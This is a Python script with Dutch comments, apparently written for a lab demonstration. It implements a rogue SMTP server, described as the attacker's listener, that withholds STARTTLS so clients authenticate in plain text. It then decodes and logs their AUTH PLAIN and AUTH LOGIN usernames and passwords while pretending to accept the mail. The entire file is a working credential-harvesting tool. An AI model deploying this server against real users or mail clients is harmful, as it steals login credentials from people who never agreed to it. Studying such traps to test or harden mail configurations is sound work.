# Luisteraar van de "aanvaller": een SMTP-server die niets bezorgt en ALLES logt,
# inclusief de AUTH-regel. Geen STARTTLS in de EHLO-lijst, zodat een client die
# wil authenticeren dat in platte tekst doet en het wachtwoord zichtbaar is.
import socket, threading, sys, base64

def log(msg):
    print(msg, flush=True)

def handle(conn, addr):
    log(f"=== VERBINDING van {addr[0]}:{addr[1]} ===")
    f = conn.makefile("rwb", buffering=0)
    f.write(b"220 lokaas.rc158 ESMTP klaar om alles op te schrijven\r\n")
    data_mode = False
    while True:
        line = f.readline()
        if not line:
            log(f"=== VERBINDING GESLOTEN door {addr[0]} ===")
            return
        txt = line.decode("utf-8", "replace").rstrip("\r\n")
        log(f"<<< {txt}")
        if data_mode:
            if txt == ".":
                data_mode = False
                f.write(b"250 2.0.0 opgeslagen als bewijs\r\n")
            continue
        up = txt.upper()
        if up.startswith("EHLO") or up.startswith("HELO"):
            f.write(b"250-lokaas.rc158\r\n250-AUTH PLAIN LOGIN\r\n250-8BITMIME\r\n250 OK\r\n")
        elif up.startswith("AUTH"):
            log(f"!!! AUTH ONTVANGEN: {txt}")
            parts = txt.split()
            if len(parts) >= 3:
                try:
                    log(f"!!! AUTH PLAIN ONTSLEUTELD: {base64.b64decode(parts[2]).decode('utf-8','replace')!r}")
                except Exception as e:
                    log(f"!!! AUTH decode mislukt: {e}")
                f.write(b"235 2.7.0 welkom, aanvaller\r\n")
            else:
                f.write(b"334 VXNlcm5hbWU6\r\n")
                u = f.readline().decode().strip()
                log(f"!!! AUTH LOGIN gebruikersnaam (b64): {u} -> {base64.b64decode(u).decode('utf-8','replace')!r}")
                f.write(b"334 UGFzc3dvcmQ6\r\n")
                p = f.readline().decode().strip()
                log(f"!!! AUTH LOGIN WACHTWOORD (b64): {p} -> {base64.b64decode(p).decode('utf-8','replace')!r}")
                f.write(b"235 2.7.0 welkom, aanvaller\r\n")
        elif up.startswith("MAIL FROM") or up.startswith("RCPT TO"):
            f.write(b"250 2.1.0 OK\r\n")
        elif up.startswith("DATA"):
            data_mode = True
            f.write(b"354 stuur maar, eindig met .\r\n")
        elif up.startswith("STARTTLS"):
            f.write(b"502 5.5.1 geen STARTTLS hier, doe het maar in platte tekst\r\n")
        elif up.startswith("QUIT"):
            f.write(b"221 2.0.0 dag\r\n")
            log(f"=== QUIT van {addr[0]} ===")
            return
        elif up.startswith("RSET") or up.startswith("NOOP"):
            f.write(b"250 2.0.0 OK\r\n")
        else:
            f.write(b"250 2.0.0 OK\r\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 2525))
s.listen(20)
log("lokaas luistert op 0.0.0.0:2525 - elke regel komt hier in de log")
while True:
    c, a = s.accept()
    threading.Thread(target=handle, args=(c, a), daemon=True).start()
